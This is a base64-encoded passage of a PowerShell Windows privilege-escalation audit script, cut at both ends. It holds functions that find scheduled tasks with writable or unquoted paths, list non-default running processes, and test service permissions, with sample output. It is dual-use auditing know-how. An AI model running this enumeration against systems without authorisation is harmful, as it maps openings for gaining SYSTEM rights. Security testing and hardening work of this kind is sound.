ICA6IFxDdXN0b21UYXNrc1xEdW1teVRhc2sKICAgIFRhc2tGaWxlICAgICAgICAgICA6IEM6XFdpbmRvd3NcU3lzdGVtMzJcVGFza3NcQ3VzdG9tVGFza3NcRHVtbXlUYXNrCiAgICBSdW5BcyAgICAgICAgICAgICAgOiBOVCBBVVRIT1JJVFlcU1lTVEVNCiAgICBDb21tYW5kICAgICAgICAgICAgOiBDOlxBUFBTXE15VGFzay5leGUKICAgIEN1cnJlbnRVc2VySXNPd25lciA6IEZhbHNlCiAgICBNb2RpZmlhYmxlUGF0aCAgICAgOiBDOlxBUFBTXAogICAgSWRlbnRpdHlSZWZlcmVuY2UgIDogTlQgQVVUSE9SSVRZXEF1dGhlbnRpY2F0ZWQgVXNlcnMKICAgIFBlcm1pc3Npb25zICAgICAgICA6IHtEZWxldGUsIFdyaXRlQXR0cmlidXRlcywgU3luY2hyb25pemUsIFJlYWRDb250cm9sLi4ufQogICAgCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICBHZXQtU2NoZWR1bGVkVGFza0xpc3QgfCBXaGVyZS1PYmplY3QgeyAtbm90ICRfLkN1cnJlbnRVc2VySXNPd25lciB9IHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAkQ3VycmVudFRhc2sgPSAkXwoKICAgICAgICAkQ3VycmVudFRhc2suQ29tbWFuZCB8IEdldC1Nb2RpZmlhYmxlUGF0aCB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAkXy5Nb2RpZmlhYmxlUGF0aCAtYW5kICgkXy5Nb2RpZmlhYmxlUGF0aCAtbmUgJycpfSB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgICAgICRDdXJyZW50VGFzayB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk1vZGlmaWFibGVQYXRoIiAtVmFsdWUgJF8uTW9kaWZpYWJsZVBhdGgKICAgICAgICAgICAgJEN1cnJlbnRUYXNrIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSWRlbnRpdHlSZWZlcmVuY2UiIC1WYWx1ZSAkXy5JZGVudGl0eVJlZmVyZW5jZQogICAgICAgICAgICAkQ3VycmVudFRhc2sgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQZXJtaXNzaW9ucyIgLVZhbHVlICRfLlBlcm1pc3Npb25zCiAgICAgICAgICAgICRDdXJyZW50VGFzawogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVNjaGVkdWxlZFRhc2tzVW5xdW90ZWRQYXRoQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEVudW1lcmF0ZXMgc2NoZWR1bGVkIHRhc2tzIHdpdGggYW4gZXhwbG9pdGFibGUgdW5xdW90ZWQgcGF0aAoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgVGhpcyBzY3JpcHQgZmlyc3QgZW51bWVyYXRlcyBhbGwgdGhlIHRhc2tzIHRoYXQgYXJlIHZpc2libGUgdG8gdGhlIGN1cnJlbnQgdXNlci4gVGhlbiwgaXQgY2hlY2tzIHRoZSAnQ29tbWFuZCcgdmFsdWUgdG8gc2VlIGlmIGl0IGlzIG5vdCBzdXJyb3VuZGVkIGJ5IHF1b3RlcyAodW5xdW90ZWQgcGF0aCkuIElmIHNvLCBpdCBjaGVja3Mgd2hldGhlciB0aGUgcGF0aCBjb250YWlucyBzcGFjZXMgYW5kIGlmIG9uZSBvZiB0aGUgaW50ZXJtZWRpYXRlIGRpcmVjdG9yaWVzIGlzIGV4cGxvaXRhYmxlLiBOb3RlIHRoYXQsIGFzIGEgbG93IHByaXZpbGVnZWQgdXNlciwgbm90IGFsbCB0aGUgdGFza3MgYXJlIHZpc2libGUuCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtU2NoZWR1bGVkVGFza3NVbnF1b3RlZFBhdGhDaGVjawoKICAgIFRhc2tOYW1lICAgICAgICAgICA6IFZ1bG5UYXNrCiAgICBUYXNrUGF0aCAgICAgICAgICAgOiBcQ3VzdG9tVGFza3NcVnVsblRhc2sKICAgIFRhc2tGaWxlICAgICAgICAgICA6IEM6XFdJTkRPV1NcU3lzdGVtMzJcVGFza3NcQ3VzdG9tVGFza3NcVnVsblRhc2sKICAgIFJ1bkFzICAgICAgICAgICAgICA6IE5UIEFVVEhPUklUWVxTWVNURU0KICAgIENvbW1hbmQgICAgICAgICAgICA6IEM6XEFQUFNcQ3VzdG9tIFRhc2tzXHRhc2suZXhlCiAgICBDdXJyZW50VXNlcklzT3duZXIgOiBGYWxzZQogICAgTW9kaWZpYWJsZVBhdGggICAgIDogQzpcQVBQUwogICAgSWRlbnRpdHlSZWZlcmVuY2UgIDogTlQgQVVUSE9SSVRZXEF1dGhlbnRpY2F0ZWQgVXNlcnMKICAgIFBlcm1pc3Npb25zICAgICAgICA6IHtEZWxldGUsIFdyaXRlQXR0cmlidXRlcywgU3luY2hyb25pemUsIFJlYWRDb250cm9sLi4ufQogICAgCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICBHZXQtU2NoZWR1bGVkVGFza0xpc3QgfCBXaGVyZS1PYmplY3QgeyAtbm90ICRfLkN1cnJlbnRVc2VySXNPd25lciB9IHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAkQ3VycmVudFRhc2sgPSAkXwoKICAgICAgICBHZXQtRXhwbG9pdGFibGVVbnF1b3RlZFBhdGggLVBhdGggJEN1cnJlbnRUYXNrLkNvbW1hbmQgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAkQ3VycmVudFRhc2sgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJNb2RpZmlhYmxlUGF0aCIgLVZhbHVlICRfLk1vZGlmaWFibGVQYXRoCiAgICAgICAgICAgICRDdXJyZW50VGFzayB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIklkZW50aXR5UmVmZXJlbmNlIiAtVmFsdWUgJF8uSWRlbnRpdHlSZWZlcmVuY2UKICAgICAgICAgICAgJEN1cnJlbnRUYXNrIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGVybWlzc2lvbnMiIC1WYWx1ZSAkXy5QZXJtaXNzaW9ucwogICAgICAgICAgICAkQ3VycmVudFRhc2sKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1SdW5uaW5nUHJvY2Vzc0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBFbnVtZXJhdGVzIHRoZSBydW5uaW5nIHByb2Nlc3NlcwoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgRmlyc3QsIGl0IGxpc3RzIGFsbCB0aGUgcHJvY2Vzc2VzIHRoYW5rcyB0byB0aGUgYnVpbHQtaW4gIkdldC1Qcm9jZXNzIiBmdW5jdGlvbi4gVGhlbiwgaXQgCiAgICBmaWx0ZXJzIHRoZSByZXN1bHQgaW4gb3JkZXIgdG8gcmV0dXJuIG9ubHkgdGhlIG5vbi1kZWZhdWx0IFdpbmRvd3MgcHJvY2Vzc2VzLiBCeSBkZWZhdWx0LAogICAgdGhpcyBmdW5jdGlvbiByZXR1cm5zIG9ubHkgcHJvY2VzcyB0aGF0IGFyZSBOT1Qgb3duZWQgYnkgdGVoIGN1cnJlbnQgdXNlciBidXQgeW91IGNhbiAKICAgIHVzZSB0aGUgIi1TZWxmIiBmbGFnIHRvIGdldCB0aGVtLiAKICAgIAogICAgLlBBUkFNRVRFUiBTZWxmCgogICAgVXNlIHRoaXMgZmxhZyB0byBnZXQgYSBsaXN0IG9mIGFsbCB0aGUgcHJvY2VzcyBvd25lZCBieSB0aGUgY3VycmVudCB1c2VyCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtUnVubmluZ1Byb2Nlc3NDaGVjayB8IGZ0CgogICAgTmFtZSAgICAgICAgICAgICAgICAgICBQSUQgVXNlciBQYXRoIFNlc3Npb25JZAogICAgLS0tLSAgICAgICAgICAgICAgICAgICAtLS0gLS0tLSAtLS0tIC0tLS0tLS0tLQogICAgY21kICAgICAgICAgICAgICAgICAgIDQyMjQgTi9BICAgICAgICAgICAgICAgMQogICAgY29uaG9zdCAgICAgICAgICAgICAgIDUzMzYgTi9BICAgICAgICAgICAgICAgMQogICAgY3RmbW9uICAgICAgICAgICAgICAgIDc0MzYgTi9BICAgICAgICAgICAgICAgMQogICAgZGxsaG9zdCAgICAgICAgICAgICAgIDM1ODQgTi9BICAgICAgICAgICAgICAgMAogICAgZGxsaG9zdCAgICAgICAgICAgICAgIDQxNzIgTi9BICAgICAgICAgICAgICAgMQogICAgZm9udGRydmhvc3QgICAgICAgICAgICA4NjAgTi9BICAgICAgICAgICAgICAgMAogICAgZm9udGRydmhvc3QgICAgICAgICAgICA5MjggTi9BICAgICAgICAgICAgICAgMQogICAgbHNhc3MgICAgICAgICAgICAgICAgICA3MzIgTi9BICAgICAgICAgICAgICAgMAogICAgTXNNcEVuZyAgICAgICAgICAgICAgIDM1MjQgTi9BICAgICAgICAgICAgICAgMAogICAgTXNNcEVuZ0NQICAgICAgICAgICAgIDExMzIgTi9BICAgICAgICAgICAgICAgMAogICAgTmlzU3J2ICAgICAgICAgICAgICAgIDQyNTYgTi9BICAgICAgICAgICAgICAgMAogICAgcmVnZWRpdCAgICAgICAgICAgICAgIDg3NDQgTi9BICAgICAgICAgICAgICAgMQogICAgU2VhcmNoRmlsdGVySG9zdCAgICAgIDkzNjAgTi9BICAgICAgICAgICAgICAgMAogICAgU2VhcmNoSW5kZXhlciAgICAgICAgICA1OTYgTi9BICAgICAgICAgICAgICAgMAogICAgU2VhcmNoUHJvdG9jb2xIb3N0ICAgICAgMzIgTi9BICAgICAgICAgICAgICAgMAogICAgU2VjdXJpdHlIZWFsdGhTZXJ2aWNlIDc5ODAgTi9BICAgICAgICAgICAgICAgMAogICAgU2dybUJyb2tlciAgICAgICAgICAgIDk1MTIgTi9BICAgICAgICAgICAgICAgMAogICAgc3Bvb2xzdiAgICAgICAgICAgICAgIDI0MTYgTi9BICAgICAgICAgICAgICAgMAogICAgVGFiVGlwICAgICAgICAgICAgICAgIDc0NTYgTi9BICAgICAgICAgICAgICAgMQogICAgd2luaW5pdCAgICAgICAgICAgICAgICA1NjQgTi9BICAgICAgICAgICAgICAgMAogICAgd2lubG9nb24gICAgICAgICAgICAgICA2NzYgTi9BICAgICAgICAgICAgICAgMQogICAgV21pUHJ2U0UgICAgICAgICAgICAgIDM5NzIgTi9BICAgICAgICAgICAgICAgMAoKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKAogICAgICAgIFtzd2l0Y2hdCiAgICAgICAgJFNlbGYgPSAkRmFsc2UKICAgICkKCiAgICAkQ3VycmVudFVzZXIgPSAkQ3VycmVudFVzZXIgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkuTmFtZSAKCiAgICAkSWdub3JlZFByb2Nlc3NOYW1lcyA9IEAoIklkbGUiLCAic2VydmljZXMiLCAiTWVtb3J5IENvbXByZXNzaW9uIiwgIlRydXN0ZWRJbnN0YWxsZXIiLCAiUHJlc2VudGF0aW9uRm9udENhY2hlIiwgIlJlZ2lzdHJ5IiwgIlNlcnZpY2VTaGVsbCIsICJTeXN0ZW0iLCAKICAgICJjc3JzcyIsICMgQ2xpZW50L1NlcnZlciBSdW50aW1lIFN1YnN5c3RlbQogICAgImR3bSIsICMgRGVza3RvcCBXaW5kb3cgTWFuYWdlcgogICAgIm1zZHRjIiwgIyBNaWNyb3NvZnQgRGlzdHJpYnV0ZWQgVHJhbnNhY3Rpb24gQ29vcmRpbmF0b3IKICAgICJzbXNzIiwgIyBTZXNzaW9uIE1hbmFnZXIgU3Vic3lzdGVtCiAgICAic3ZjaG9zdCIgIyBTZXJ2aWNlIEhvc3QKICAgICkKCiAgICAkQWxsUHJvY2VzcyA9IEdldC1Qcm9jZXNzIAoKICAgIEZvckVhY2ggKCRQcm9jZXNzIGluICRBbGxQcm9jZXNzKSB7CgogICAgICAgIGlmICgtbm90ICgkSWdub3JlZFByb2Nlc3NOYW1lcyAtY29udGFpbnMgJFByb2Nlc3MuTmFtZSApKSB7CgogICAgICAgICAgICAkUHJvY2Vzc1VzZXIgPSAoR2V0LVVzZXJGcm9tUHJvY2VzcyAtUHJvY2Vzc0lkICRQcm9jZXNzLklkKS5EaXNwbGF5TmFtZQoKICAgICAgICAgICAgJFJldHVyblByb2Nlc3MgPSAkRmFsc2UKCiAgICAgICAgICAgIGlmICgkU2VsZikgewogICAgICAgICAgICAgICAgaWYgKCRQcm9jZXNzVXNlciAtZXEgJEN1cnJlbnRVc2VyKSB7CiAgICAgICAgICAgICAgICAgICAgJFJldHVyblByb2Nlc3MgPSAkVHJ1ZSAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICgtbm90ICgkUHJvY2Vzc1VzZXIgLWVxICRDdXJyZW50VXNlcikpIHsKCiAgICAgICAgICAgICAgICAgICAgIyBIZXJlLCBJIGNoZWNrIHdoZXRoZXIgJ0M6XFdpbmRvd3NcU3lzdGVtMzJcPFBST0NfTkFNRT4uZXhlJyBleGlzdHMKICAgICAgICAgICAgICAgICAgICAjIE5vdCBpZGVhbCBidXQgaXQncyBhIHF1aWNrIHdheSB0byBjaGVjayB3aGV0aGVyIGl0J3MgYSBidWlsdC1pbiBiaW5hcnkuCiAgICAgICAgICAgICAgICAgICAgIyBUaGVyZSBtaWdodCBiZSBzb21lIGlzc3VlcyBiZWNhdXNlIG9mIHRoZSBGaWxlU3lzdGVtIFJlZGlyZWN0b3IgaWYgdGhlIHNjcmlwdCBpcyAKICAgICAgICAgICAgICAgICAgICAjIHJ1biBmcm9tIGEgMzItYml0cyBpbnN0YW5jZSBvZiBwb3dlcnNoZWxsLmV4ZSAoLT4gU3lzV293NjQgaW5zdGVhZCBvZiBTeXN0ZW0zMikuCiAgICAgICAgICAgICAgICAgICAgJFBvdGVudGlhbEltYWdlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZW52OlN5c3RlbVJvb3QgLUNoaWxkUGF0aCAiU3lzdGVtMzIiCiAgICAgICAgICAgICAgICAgICAgJFBvdGVudGlhbEltYWdlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkUG90ZW50aWFsSW1hZ2VQYXRoIC1DaGlsZFBhdGggIiQoJFByb2Nlc3MubmFtZSkuZXhlIgoKICAgICAgICAgICAgICAgICAgICAjIElmIHdlIGNhbid0IGZpbmQgaXQgaW4gU3lzdGVtMzIsIGFkZCBpdCB0byB0aGUgbGlzdCAKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRQb3RlbnRpYWxJbWFnZVBhdGgpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZXR1cm5Qcm9jZXNzID0gJFRydWUgCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRSZXR1cm5Qcm9jZXNzID0gJFRydWUgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUmV0dXJuUHJvY2VzcykgewogICAgICAgICAgICAgICAgJFJ1bm5pbmdQcm9jZXNzID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICAgICAkUnVubmluZ1Byb2Nlc3MgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgJFByb2Nlc3MuTmFtZSAKICAgICAgICAgICAgICAgICRSdW5uaW5nUHJvY2VzcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBJRCIgLVZhbHVlICRQcm9jZXNzLklkIAogICAgICAgICAgICAgICAgJFJ1bm5pbmdQcm9jZXNzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVXNlciIgLVZhbHVlICQoaWYgKCRQcm9jZXNzVXNlcikgeyAkUHJvY2Vzc1VzZXIgfSBlbHNlIHsgIk4vQSIgfSkKICAgICAgICAgICAgICAgICRSdW5uaW5nUHJvY2VzcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBhdGgiIC1WYWx1ZSAkUHJvY2Vzcy5QYXRoIAogICAgICAgICAgICAgICAgJFJ1bm5pbmdQcm9jZXNzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU2Vzc2lvbklkIiAtVmFsdWUgJFByb2Nlc3MuU2Vzc2lvbklkCiAgICAgICAgICAgICAgICAkUnVubmluZ1Byb2Nlc3MKICAgICAgICAgICAgfQoKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJJZ25vcmVkOiAkKCRQcm9jZXNzLk5hbWUpIgogICAgICAgIH0KICAgIH0KfQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBFTkQgSU5TVEFMTEVEIFBST0dSQU1TICAgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQkVHSU4gU0VSVklDRVMgICAKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmZ1bmN0aW9uIFRlc3QtU2VydmljZURhY2xQZXJtaXNzaW9uIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBUZXN0cyBvbmUgb3IgbW9yZSBwYXNzZWQgc2VydmljZXMgb3Igc2VydmljZSBuYW1lcyBhZ2FpbnN0IGEgZ2l2ZW4gcGVybWlzc2lvbiBzZXQsCiAgICByZXR1cm5pbmcgdGhlIHNlcnZpY2Ugb2JqZWN0cyB3aGVyZSB0aGUgY3VycmVudCB1c2VyIGhhdmUgdGhlIHNwZWNpZmllZCBwZXJtaXNzaW9ucy4KCiAgICBBdXRob3I6IEBoYXJtajB5LCBNYXR0aGV3IEdyYWViZXIKICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQoKICAgIC5ERVNDUklQVElPTgoKICAgIFRha2VzIGEgc2VydmljZSBOYW1lIG9yIGEgU2VydmljZVByb2Nlc3MuU2VydmljZUNvbnRyb2xsZXIgb24gdGhlIHBpcGVsaW5lLCBhbmQgZmlyc3QgYWRkcwogICAgYSBzZXJ2aWNlIERhY2wgdG8gdGhlIHNlcnZpY2Ugb2JqZWN0IHdpdGggQWRkLVNlcnZpY2VEYWNsLiBBbGwgZ3JvdXAgU0lEcyBmb3IgdGhlIGN1cnJlbnQKICAgIHVzZXIgYXJlIGVudW1lcmF0ZWQgc2VydmljZXMgd2hlcmUgdGhlIHVzZXIgaGFzIHNvbWUgdHlwZSBvZiBwZXJtaXNzaW9uIGFyZSBmaWx0ZXJlZC4gVGhlCiAgICBzZXJ2aWNlcyBhcmUgdGhlbiBmaWx0ZXJlZCBhZ2FpbnN0IGEgc3BlY2lmaWVkIHNldCBvZiBwZXJtaXNzaW9ucywgYW5kIHNlcnZpY2VzIHdoZXJlIHRoZQogICAgY3VycmVudCB1c2VyIGhhdmUgdGhlIHNwZWNpZmllZCBwZXJtaXNzaW9ucyBhcmUgcmV0dXJuZWQuCgogICAgLlBBUkFNRVRFUiBOYW1lCgogICAgQW4gYXJyYXkgb2Ygb25lIG9yIG1vcmUgc2VydmljZSBuYW1lcyB0byB0ZXN0IGFnYWluc3QgdGhlIHNwZWNpZmllZCBwZXJtaXNzaW9uIHNldC4KCiAgICAuUEFSQU1FVEVSIFBlcm1pc3Npb25zCgogICAgQSBtYW51YWwgc2V0IG9mIHBlcm1pc3Npb24gdG8gdGVzdCBhZ2Fpbi4gT25lIG9mOidRdWVyeUNvbmZpZycsICdDaGFuZ2VDb25maWcnLCAnUXVlcnlTdGF0dXMnLAogICAgJ0VudW1lcmF0ZURlcGVuZGVudHMnLCAnU3RhcnQnLCAnU3RvcCcsICdQYXVzZUNvbnRpbnVlJywgJ0ludGVycm9nYXRlJywgVXNlckRlZmluZWRDb250cm9sJywKICAgICdEZWxldGUnLCAnUmVhZENvbnRyb2wnLCAnV3JpdGVEYWMnLCAnV3JpdGVPd25lcicsICdTeW5jaHJvbml6ZScsICdBY2Nlc3NTeXN0ZW1TZWN1cml0eScsCiAgICAnR2VuZXJpY0FsbCcsICdHZW5lcmljRXhlY3V0ZScsICdHZW5lcmljV3JpdGUnLCAnR2VuZXJpY1JlYWQnLCAnQWxsQWNjZXNzJwoKICAgIC5QQVJBTUVURVIgUGVybWlzc2lvblNldAoKICAgIEEgcHJlLWRlZmluZWQgcGVybWlzc2lvbiBzZXQgdG8gdGVzdCBhIHNwZWNpZmllZCBzZXJ2aWNlIGFnYWluc3QuICdDaGFuZ2VDb25maWcnLCAnUmVzdGFydCcsIG9yICdBbGxBY2Nlc3MnLgoKICAgIC5PVVRQVVRTCgogICAgU2VydmljZVByb2Nlc3MuU2VydmljZUNvbnRyb2xsZXIKCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gR2V0LVNlcnZpY2UgfCBUZXN0LVNlcnZpY2VEYWNsUGVybWlzc2lvbgoKICAgIFJldHVybiBhbGwgc2VydmljZSBvYmplY3RzIHdoZXJlIHRoZSBjdXJyZW50IHVzZXIgY2FuIG1vZGlmeSB0aGUgc2VydmljZSBjb25maWd1cmF0aW9uLgoKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBHZXQtU2VydmljZSB8IFRlc3QtU2VydmljZURhY2xQZXJtaXNzaW9uIC1QZXJtaXNzaW9uU2V0ICdSZXN0YXJ0JwoKICAgIFJldHVybiBhbGwgc2VydmljZSBvYmplY3RzIHRoYXQgdGhlIGN1cnJlbnQgdXNlciBjYW4gcmVzdGFydC4KCgogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IFRlc3QtU2VydmljZURhY2xQZXJtaXNzaW9uIC1QZXJtaXNzaW9ucyAnU3RhcnQnIC1OYW1lICdWdWxuU1ZDJwoKICAgIFJldHVybiB0aGUgVnVsblNWQyBvYmplY3QgaWYgdGhlIGN1cnJlbnQgdXNlciBoYXMgc3RhcnQgcGVybWlzc2lvbnMuCgogICAgLkxJTksKICAgIGh0dHBzOi8vcm9obnNwb3dlcnNoZWxsYmxvZy53b3JkcHJlc3MuY29tLzIwMTMvMDMvMTkvdmlld2luZy1zZXJ2aWNlLWFjbHMvCiAgICAjPgogICAgW091dHB1dFR5cGUoJ1NlcnZpY2VQcm9jZXNzLlNlcnZpY2VDb250cm9sbGVyJyldCiAgICBwYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0wLCBNYW5kYXRvcnk9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgJE5hbWUsCgogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICBbVmFsaWRhdGVTZXQoJ1F1ZXJ5Q29uZmlnJywgJ0NoYW5nZUNvbmZpZycsICdRdWVyeVN0YXR1cycsICdFbnVtZXJhdGVEZXBlbmRlbnRzJywgJ1N0YXJ0JywgJ1N0b3AnLCAnUGF1c2VDb250aW51ZScsICdJbnRlcnJvZ2F0ZScsICdVc2VyRGVmaW5lZENvbnRyb2wnLCAnRGVsZXRlJywgJ1JlYWRDb250cm9sJywgJ1dyaXRlRGFjJywgJ1dyaXRlT3duZXInLCAnU3luY2hyb25pemUnLCAnQWNjZXNzU3lzdGVtU2VjdXJpdHknLCAnR2VuZXJpY0FsbCcsICdHZW5lcmljRXhlY3V0ZScsICdHZW5lcmljV3JpdGUnLCAnR2VuZXJpY1JlYWQnLCAnQWxsQWNjZXNzJyldCiAgICAgICAgJFBlcm1pc3Npb25zLAoKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQ2hhbmdlQ29uZmlnJywgJ1Jlc3RhcnQnLCAnQWxsQWNjZXNzJyldCiAgICAgICAgJFBlcm1pc3Npb25TZXQgPSAnQ2hhbmdlQ29uZmlnJwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkQWNjZXNzTWFzayA9IEB7CiAgICAgICAgICAgICdRdWVyeUNvbmZpZycgICAgICAgICAgID0gW3VpbnQzMl0nMHgwMDAwMDAwMScKICAgICAgICAgICAgJ0NoYW5nZUNvbmZpZycgICAgICAgICAgPSBbdWludDMyXScweDAwMDAwMDAyJwogICAgICAgICAgICAnUXVlcnlTdGF0dXMnICAgICAgICAgICA9IFt1aW50MzJdJzB4MDAwMDAwMDQnCiAgICAgICAgICAgICdFbnVtZXJhdGVEZXBlbmRlbnRzJyAgID0gW3VpbnQzMl0nMHgwMDAwMDAwOCcKICAgICAgICAgICAgJ1N0YXJ0JyAgICAgICAgICAgICAgICAgPSBbdWludDMyXScweDAwMDAwMDEwJwogICAgICAgICAgICAnU3RvcCcgICAgICAgICAgICAgICAgICA9IFt1aW50MzJdJzB4MDAwMDAwMjAnCiAgICAgICAgICAgICdQYXVzZUNvbnRpbnVlJyAgICAgICAgID0gW3VpbnQzMl0nMHgwMDAwMDA0MCcKICAgICAgICAgICAgJ0ludGVycm9nYXRlJyAgICAgICAgICAgPSBbdWludDMyXScweDAwMDAwMDgwJwogICAgICAgICAgICAnVXNlckRlZmluZWRDb250cm9sJyAgICA9IFt1aW50MzJdJzB4MDAwMDAxMDAnCiAgICAgICAgICAgICdEZWxldGUnICAgICAgICAgICAgICAgID0gW3VpbnQzMl0nMHgwMDAxMDAwMCcKICAgICAgICAgICAgJ1JlYWRDb250cm9sJyAgICAgICAgICAgPSBbdWludDMyXScweDAwMDIwMDAwJwogICAgICAgICAgICAnV3JpdGVEYWMnICAgICAgICAgICAgICA9IFt1aW50MzJdJzB4MDAwNDAwMDAnCiAgICAgICAgICAgICdXcml0ZU93bmVyJyAgICAgICAgICAgID0gW3VpbnQzMl0nMHgwMDA4MDAwMCcKICAgICAgICAgICAgJ1N5bmNocm9uaXplJyAgICAgICAgICAgPSBbdWludDMyXScweDAwMTAwMDAwJwogICAgICAgICAgICAnQWNjZXNzU3lzdGVtU2VjdXJpdHknICA9IFt1aW50MzJdJzB4MDEwMDAwMDAnCiAgICAgICAgICAgICdHZW5lcmljQWxsJyAgICAgICAgICAgID0gW3VpbnQzMl0nMHgxMDAwMDAwMCcKICAgICAgICAgICAgJ0dlbmVyaWNFeGVjdXRlJyAgICAgICAgPSBbdWludDMyXScweDIwMDAwMDAwJwogICAgICAgICAgICAnR2VuZXJpY1dyaXRlJyAgICAgICAgICA9IFt1aW50MzJdJzB4NDAwMDAwMDAnCiAgICAgICAgICAgICdHZW5lcmljUmVhZCcgICAgICAgICAgID0gW3VpbnQzMl0nMHg4MDAwMDAwMCcKICAgICAgICAgICAgJ0FsbEFjY2VzcycgICAgICAgICAgICAgPSBbdWludDMyXScweDAwMEYwMUZGJwogICAgICAgIH0KICAgICAgICAKICAgICAgICAkQ2hlY2tBbGxQZXJtaXNzaW9uc0luU2V0ID0gJEZhbHNlCgogICAgICAgIGlmKCRQU0JvdW5kUGFyYW1ldGVyc1snUGVybWlzc2lvbnMnXSkgewogICAgICAgICAgICAkVGFyZ2V0UGVybWlzc2lvbnMgPSAkUGVybWlzc2lvbnMKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIGlmKCRQZXJtaXNzaW9uU2V0IC1lcSAnQ2hhbmdlQ29uZmlnJykgewogICAgICAgICAgICAgICAgJFRhcmdldFBlcm1pc3Npb25zID0gQCgnQ2hhbmdlQ29uZmlnJywgJ1dyaXRlRGFjJywgJ1dyaXRlT3duZXInLCAnR2VuZXJpY0FsbCcsICcgR2VuZXJpY1dyaXRlJywgJ0FsbEFjY2VzcycpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRQZXJtaXNzaW9uU2V0IC1lcSAnUmVzdGFydCcpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRQZXJtaXN